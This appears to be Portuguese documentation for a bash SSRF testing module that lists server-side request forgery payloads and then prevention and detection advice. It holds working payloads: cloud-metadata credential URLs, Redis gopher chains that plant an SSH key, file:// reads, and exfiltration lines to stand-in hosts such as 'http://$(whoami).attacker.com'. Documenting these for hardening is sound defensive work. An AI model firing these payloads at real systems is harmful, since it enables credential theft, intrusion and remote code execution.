# SSRF Tester - Módulo de Testes Server-Side Request Forgery

## Descrição

O `ssrf-tester.sh` é um módulo especializado em testes de **Server-Side Request Forgery (SSRF)**. Utiliza os payloads do repositório **PayloadsAllTheThings/Server Side Request Forgery** para fornecer cobertura completa de técnicas de SSRF, bypass e exploração de cloud metadata.

## Motivação

SSRF é uma vulnerabilidade crítica que permite que atacantes:
- **Acessem serviços internos**: Redis, MySQL, MongoDB, Elasticsearch
- **Extraiam cloud metadata**: Credenciais AWS, GCP, Azure
- **Façam port scanning**: Descoberta de serviços na rede interna
- **Leiam arquivos locais**: Via file:// protocol
- **Executem comandos**: Via gopher:// protocol em serviços vulneráveis

A modularização facilita:
1. **Testes Especializados**: Foco exclusivo em SSRF
2. **Cloud Security**: Testes específicos para AWS, GCP, Azure, etc.
3. **Bypass Avançado**: 50+ técnicas de evasão
4. **Internal Network**: Descoberta de serviços internos

## Estrutura

O módulo está organizado em 6 categorias principais:

### 1. SSRF Básico (25 testes)
**Targets Localhost e Redes Privadas**

#### Localhost Variations:
- `http://localhost` (porta 80, 22, 443, 3306, 6379)
- `http://127.0.0.1` (múltiplas portas)
- `http://0.0.0.0` (wildcard address)
- `http://localtest.me` (resolve para ::1)
- `http://localh.st` (resolve para 127.0.0.1)

#### Private Networks:
- `192.168.0.1`, `192.168.1.1` (Class C)
- `10.0.0.1` (Class A)
- `172.16.0.1` (Class B)

#### Parameter Variations:
- `?url=`, `?dest=`, `?target=`, `?redirect=`
- `?uri=`, `?path=`, `?continue=`

### 2. SSRF Bypass (50 testes)
**Técnicas de Evasão de Filtros**

#### IPv6 Bypass:
- `http://[::]:80/` - Unspecified address
- `http://[0000::1]:80/` - Loopback
- `http://[::ffff:127.0.0.1]` - IPv4-mapped IPv6
- `http://[0:0:0:0:0:ffff:127.0.0.1]` - Full notation
- `http://ip6-localhost`, `http://ip6-loopback`

#### CIDR Bypass:
```bash
# Range 127.0.0.0/8 é todo localhost
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

#### Rare Address Formats:
```bash
http://0/           # Short for 0.0.0.0
http://127.1        # Short for 127.0.0.1
http://127.0.1      # Short for 127.0.0.1
```

#### IP Encoding:

**Decimal IP**:
```bash
http://2130706433/      # 127.0.0.1
http://3232235521/      # 192.168.0.1
http://2852039166/      # 169.254.169.254 (AWS metadata)
```

**Octal IP**:
```bash
http://0177.0.0.1/      # 127.0.0.1
http://o177.0.0.1/      # 127.0.0.1
http://0o177.0.0.1/     # 127.0.0.1
http://q177.0.0.1/      # 127.0.0.1
```

**Hexadecimal IP**:
```bash
http://0x7f000001       # 127.0.0.1
http://0xc0a80101       # 192.168.1.1
http://0xa9fea9fe       # 169.254.169.254
```

#### URL Encoding:
```bash
http://127.0.0.1/%61dmin      # Single encode
http://127.0.0.1/%2561dmin    # Double encode
```

#### Unicode Bypass:
```bash
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ    # Enclosed alphanumeric
```

#### Domain Redirects:
```bash
http://127.0.0.1.nip.io           # NIP.IO magic DNS
http://company.127.0.0.1.nip.io   # Custom subdomain
```

#### URL Parsing Discrepancy:
```bash
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

Diferentes libraries interpretam de formas diferentes:
- `urllib2` → 127.1.1.1
- `requests` → 127.2.2.2
- `urllib` → 127.127.127.127

#### PHP filter_var() Bypass:
```bash
http://test???test.com
0://evil.com:80;http://google.com:80/
```

#### JAR Scheme (Java Blind SSRF):
```bash
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

### 3. Cloud Metadata (30 testes)
**Exploração de Serviços Cloud**

#### AWS EC2 (Instance Metadata Service)

**IMDSv1** (Legacy, sem autenticação):
```bash
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/
```

**IMDSv2** (Requer token):
```bash
# Step 1: Get token (PUT request)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

**Bypass Encoding**:
```bash
http://2852039166/latest/meta-data/            # Decimal
http://0xa9fea9fe/latest/meta-data/            # Hex
http://0251.0376.0251.0376/latest/meta-data/   # Octal
http://169.254.169.254/latest/%6deta-data/     # URL encoded
```

#### Google Cloud Platform

```bash
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Headers necessários**:
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
```

#### Microsoft Azure

```bash
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**Headers necessários**:
```bash
curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

#### DigitalOcean

```bash
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
```

#### Oracle Cloud

```bash
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
```

#### Alibaba Cloud

```bash
http://100.100.100.200/latest/meta-data/
```

#### Kubernetes

```bash
https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts/
file:///var/run/secrets/kubernetes.io/serviceaccount/token
```

#### Docker

```bash
http://unix:/var/run/docker.sock:/containers/json
http://localhost:2375/containers/json
http://localhost:2376/containers/json
```

### 4. URL Schemes (25 testes)
**Protocolos Alternativos**

#### file:// - File Read
```bash
file:///etc/passwd
file:////etc/passwd
file://localhost/etc/passwd
file:///C:/Windows/win.ini           # Windows
```

#### dict:// - Dictionary Protocol
```bash
dict://localhost:11211/stats         # Memcached
dict://localhost:6379/info           # Redis
```

#### gopher:// - Multi-Protocol
```bash
gopher://localhost:25/_MAIL%20FROM   # SMTP
gopher://localhost:6379/_INFO        # Redis
gopher://localhost:3306/_SELECT      # MySQL
```

**Exemplo gopher para SMTP**:
```bash
gopher://localhost:25/_MAIL%20FROM:<attacker@evil.com>%0D%0ARCPT%20TO:<victim@target.com>%0D%0ADATA%0D%0ASubject:%20SSRF%0D%0A%0D%0AMessage%20body%0D%0A.%0D%0AQUIT
```

#### ldap:// - LDAP Protocol
```bash
ldap://localhost:389/
ldap://localhost:11211/%0astats%0aquit
```

#### sftp:// - Secure FTP
```bash
sftp://localhost:22/
sftp://evil.com:11111/
```

#### tftp:// - Trivial FTP (UDP)
```bash
tftp://localhost:69/test
tftp://evil.com:12346/TESTUDPPACKET
```

#### ftp:// - File Transfer
```bash
ftp://localhost/
ftp://user:pass@localhost/
```

#### netdoc:// - Java Wrapper
```bash
netdoc:///etc/passwd
netdoc:///C:/Windows/win.ini
```

#### jar:// - Java Archive
```bash
jar:http://localhost!/
jar:file:///etc/passwd!/
```

#### php:// - PHP Wrappers
```bash
php://input
php://filter/convert.base64-encode/resource=/etc/passwd
```

#### data:// - Data URI
```bash
data://text/plain,SSRF_TEST
```

### 5. Internal Services (20 testes)
**Serviços na Rede Interna**

#### Redis (6379)
```bash
http://127.0.0.1:6379/
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_SET%20key%20value
```

#### MySQL (3306)
```bash
http://127.0.0.1:3306/
gopher://127.0.0.1:3306/_SELECT%20version()
```

#### PostgreSQL (5432)
```bash
http://127.0.0.1:5432/
```

#### MongoDB (27017, 28017)
```bash
http://127.0.0.1:27017/
http://127.0.0.1:28017/          # HTTP interface
```

#### Memcached (11211)
```bash
http://127.0.0.1:11211/
dict://127.0.0.1:11211/stats
```

#### Elasticsearch (9200)
```bash
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_cluster/health
```

#### SMTP (25)
```bash
http://127.0.0.1:25/
gopher://127.0.0.1:25/_EHLO
```

#### Jenkins (8080)
```bash
http://127.0.0.1:8080/jenkins
http://127.0.0.1:8080/script
```

#### Docker (2375, 2376)
```bash
http://127.0.0.1:2375/containers/json
https://127.0.0.1:2376/containers/json
```

#### Kubernetes (8001, 10250)
```bash
http://127.0.0.1:8001/api/
https://127.0.0.1:10250/pods
```

#### Apache Tomcat (8080)
```bash
http://127.0.0.1:8080/manager/html
```

### 6. Blind SSRF (15 testes)
**Out-of-Band Detection**

#### DNS Exfiltration:
```bash
http://ssrf-test.burp.oastify.com
http://$(whoami).attacker.com
```

#### HTTP Callbacks:
```bash
http://evil.com/ssrf-callback
http://evil.com/$(id)
```

#### Time-Based Detection:
```bash
http://127.0.0.1:9999          # Connection timeout
http://192.168.255.255:80      # Network timeout
```

#### SVG SSRF to XSS:
```bash
http://brutelogic.com.br/poc.svg
```

#### Webhooks:
```bash
?webhook=http://evil.com/hook
```

#### PDF/Image Processing:
```bash
?pdf_url=http://127.0.0.1/
?image=http://127.0.0.1/secret.png
?avatar=http://169.254.169.254/
```

#### HTTP Redirects:
```bash
https://307.r3dir.me/--to/?url=http://localhost
http://redirect.burp.oastify.com/?target=http://127.0.0.1
```

#### DNS Rebinding:
```bash
http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

## Uso

### Executar apenas testes SSRF
```bash
./head-test.sh -u https://example.com -c ssrf
```

### Executar todos os testes (incluindo SSRF)
```bash
./head-test.sh -u https://example.com -c all
```

### Com velocidade TURBO
```bash
./head-test.sh -u https://example.com -c ssrf --speed 5
```

### Filtrar apenas vulnerabilidades
```bash
./head-test.sh -u https://example.com -c ssrf --filter fail
```

## Arquitetura

```
head-test.sh
├── source ssrf-tester.sh
│   ├── test_ssrf_basic()
│   ├── test_ssrf_bypass()
│   ├── test_ssrf_cloud_metadata()
│   ├── test_ssrf_url_schemes()
│   ├── test_ssrf_internal_services()
│   ├── test_ssrf_blind()
│   └── run_all_ssrf_tests() [função principal]
└── PayloadsAllTheThings/Server Side Request Forgery/
    ├── README.md
    ├── SSRF-Advanced-Exploitation.md
    └── SSRF-Cloud-Instances.md
```

## Payloads Utilizados

- **PayloadsAllTheThings**: SSRF repository
- **Cloud-specific**: AWS, GCP, Azure, DO, Oracle, Alibaba
- **Protocol-specific**: gopher, dict, ldap, file
- **Blind SSRF chains**: assetnote/blind-ssrf-chains

## Técnicas Testadas

### 1. **Basic SSRF**
Acesso a localhost e redes privadas.

### 2. **Bypass Filters**
50+ técnicas de evasão:
- IPv6 formats
- IP encoding (decimal, octal, hex)
- URL parsing discrepancy
- Domain redirects (nip.io)
- Protocol smuggling

### 3. **Cloud Metadata Exploitation**
Extração de credenciais e informações sensíveis:
- AWS IAM credentials
- GCP service account tokens
- Azure managed identity tokens
- Kubernetes service account tokens

### 4. **Protocol Exploitation**
Uso de protocolos alternativos:
- file:// para leitura de arquivos
- gopher:// para RCE em Redis/MySQL
- dict:// para information disclosure

### 5. **Internal Network Discovery**
Port scanning e descoberta de serviços:
- Databases (MySQL, PostgreSQL, MongoDB, Redis)
- Message queues (RabbitMQ, Kafka)
- Admin panels (Jenkins, Tomcat)

### 6. **Blind SSRF**
Out-of-Band detection quando não há resposta visível:
- DNS exfiltration
- HTTP callbacks
- Time-based detection

## Quantidade de Testes

**Total estimado: 200+ testes de SSRF**

Distribuídos em:
- 25 testes básicos (localhost, private networks)
- 50 testes de bypass (encoding, IPv6, parsing)
- 30 testes cloud metadata (AWS, GCP, Azure, etc.)
- 25 testes URL schemes (file, gopher, dict, etc.)
- 20 testes internal services
- 15 testes blind SSRF
- +15 testes SSRF (já existentes no head-test.sh)

## Cloud Providers Suportados

- ✅ **AWS** (Amazon Web Services)
- ✅ **GCP** (Google Cloud Platform)
- ✅ **Azure** (Microsoft Azure)
- ✅ **DigitalOcean**
- ✅ **Oracle Cloud**
- ✅ **Alibaba Cloud**
- ✅ **Kubernetes**
- ✅ **Docker**

## Comparação com Ferramentas

| Ferramenta | ssrf-tester.sh | SSRFmap | Gopherus |
|------------|----------------|---------|----------|
| **Propósito** | Hardening test | Exploitation | gopher payload gen |
| **Velocidade** | ⚡ Muito rápido | 🐢 Lento | ⚡ Instant |
| **Cobertura** | 200+ payloads | Completa | Focused |
| **Automação** | Total | Semi-auto | Manual |
| **Cloud metadata** | ✅ 30 testes | ✅ Sim | ❌ Não |
| **Blind SSRF** | ✅ OOB | ✅ Sim | ❌ Não |
| **Uso** | CI/CD, hardening | Pentesting | RCE via gopher |

## Casos de Uso

### 1. **Hardening Validation**
Verificar se proteções contra SSRF estão funcionando.

### 2. **Cloud Security Audit**
Testar se metadata endpoints estão protegidos.

### 3. **CI/CD Integration**
```bash
#!/bin/bash
STAGING_URL="https://staging.example.com"

./head-test.sh -u "$STAGING_URL" -c ssrf --speed 5 --filter fail

if [ $? -ne 0 ]; then
    echo "❌ SSRF vulnerabilities detected!"
    exit 1
fi
```

### 4. **Internal Network Mapping**
Descobrir serviços expostos na rede interna.

## Severidade

SSRF é classificada como **CRÍTICA/ALTA** porque:

- ✅ **Cloud metadata**: Roubo de credenciais IAM (AWS), service accounts (GCP)
- ✅ **Internal network**: Port scanning, service discovery
- ✅ **File read**: Acesso a /etc/passwd, chaves privadas
- ✅ **RCE**: Via gopher:// em Redis, MySQL, SMTP
- ✅ **Data exfiltration**: Blind SSRF com DNS/HTTP callbacks
- ✅ **Privilege escalation**: Kubernetes service account tokens

**CVSS Score**: 
- SSRF (metadata): 8.0-9.0 (CRITICAL)
- SSRF (internal services): 7.0-8.5 (HIGH)
- SSRF (file read): 6.5-7.5 (MEDIUM-HIGH)

## Exemplos de Exploração Real

### AWS Metadata Theft
```python
# Código vulnerável
import requests

def fetch_url(url):
    return requests.get(url).text

# Exploit
url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"
creds = fetch_url(url)
# Returns: AWS Access Key, Secret Key, Session Token
```

### Redis RCE via Gopher
```bash
# Gopher payload para escrever SSH key no Redis
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0assh-rsa AAAAB3...%0a%0a%0d%0a

# Payload para salvar em arquivo
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/root/.ssh/%0d%0a
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0asave%0d%0a
```

### File Read
```php
// Código vulnerável
<?php
$url = $_GET['url'];
echo file_get_contents($url);
?>

// Exploit
?url=file:///etc/passwd
?url=file:///var/www/html/config.php
```

## Prevenção

### 1. **Whitelist de Domínios**
❌ **RUIM**:
```python
import requests
url = request.args.get('url')
requests.get(url)
```

✅ **BOM**:
```python
import requests
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

url = request.args.get('url')
parsed = urlparse(url)

if parsed.hostname not in ALLOWED_DOMAINS:
    raise ValueError("Domain not allowed")

requests.get(url)
```

### 2. **Blacklist de IPs Privados**
```python
import ipaddress
import socket

def is_safe_url(url):
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    # Resolve hostname to IP
    ip = socket.gethostbyname(hostname)
    ip_obj = ipaddress.ip_address(ip)
    
    # Block private networks
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
        return False
    
    # Block cloud metadata
    if str(ip_obj) == '169.254.169.254':
        return False
        
    return True
```

### 3. **Validação de Esquema**
```python
ALLOWED_SCHEMES = ['http', 'https']

parsed = urlparse(url)
if parsed.scheme not in ALLOWED_SCHEMES:
    raise ValueError("Invalid URL scheme")
```

### 4. **Network Segmentation**
```bash
# iptables - Block metadata endpoint
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# Block private networks from web servers
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
```

### 5. **AWS IMDSv2 (Require Token)**
```bash
# Force IMDSv2
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

### 6. **Disable Unnecessary Protocols**
```python
# Python requests - disable file:// protocol
import requests

# Only allow HTTP/HTTPS
session = requests.Session()
session.mount('file://', None)
session.mount('ftp://', None)
session.mount('gopher://', None)
```

## Detecção e Monitoramento

### 1. **WAF Rules**
```nginx
# Nginx + ModSecurity
SecRule ARGS "@rx (?:127\.0\.0\.1|localhost|169\.254\.169\.254)" "id:2001,deny,status:403"
SecRule ARGS "@rx (?:file://|gopher://|dict://)" "id:2002,deny,status:403"
```

### 2. **Log Monitoring**
```bash
# Monitor outbound connections
tcpdump -i any -n dst port 6379 or dst port 3306

# AWS CloudTrail - Monitor metadata access
# Alert on: ec2:DescribeInstanceAttribute from unusual IPs
```

### 3. **Network Monitoring**
- Monitor conexões para 169.254.169.254
- Alert em acesso a portas internas (6379, 3306, 27017)
- Monitorar DNS queries para *.burp.oastify.com

## Próximos Passos

Melhorias futuras:

1. **SSRF Chain Exploitation**: Integrar blind-ssrf-chains
2. **Gopherus Integration**: Gerar payloads gopher automaticamente
3. **Cloud-specific**: Mais testes para Oracle, Alibaba, IBM Cloud
4. **Container escape**: Docker socket exploitation
5. **XXE to SSRF**: Combinar XXE + SSRF

## Ferramentas Complementares

- **[SSRFmap](https://github.com/swisskyrepo/SSRFmap)**: Automatic SSRF fuzzer
- **[Gopherus](https://github.com/tarunkant/Gopherus)**: Gopher payload generator
- **[See-SURF](https://github.com/In3tinct/See-SURF)**: SSRF parameter scanner
- **[ipfuscator](https://github.com/dwisiswant0/ipfuscator)**: IP obfuscation tool
- **[Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)**: OOB detection

## Referências

- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [PortSwigger - Server-Side Request Forgery](https://portswigger.net/web-security/ssrf)
- [OWASP - Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [HackTricks - SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [Orange Tsai - A New Era of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- [AWS IMDS Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)

## FAQ

**Q: Por que testar SSRF se minha aplicação não faz HTTP requests?**  
A: Muitas funcionalidades modernas fazem requests: webhooks, PDF generation, image processing, URL previews, etc.

**Q: SSRF é perigoso mesmo em redes segmentadas?**  
A: Sim! Cloud metadata (169.254.169.254) está sempre acessível da própria máquina.

**Q: Como diferenciar SSRF de Open Redirect?**  
A: SSRF o servidor faz o request, Open Redirect o client (browser) faz.

**Q: IMDSv2 protege contra SSRF?**  
A: Parcialmente. Requer token via PUT request, mas alguns SSRFs permitem PUT.

**Meta final**: 100% de proteção contra SSRF e cloud metadata access!
